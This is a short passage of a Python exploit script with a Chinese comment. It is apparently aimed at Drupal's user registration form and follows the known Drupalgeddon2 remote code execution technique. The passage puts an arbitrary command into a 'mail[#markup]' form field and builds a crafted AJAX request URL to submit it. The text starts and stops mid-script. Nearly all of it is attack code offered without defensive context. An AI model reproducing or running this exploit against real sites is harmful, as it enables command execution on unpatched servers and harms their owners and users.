        'mail[#type]': 'markup',
        'mail[#markup]': command
    }
    # 发送POST请求到用户注册页面
    url = target_url.rstrip('/') + '/user/register?element_parents=mail/mail&ajax_form=1&_wrapper_format=drupal_ajax'
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
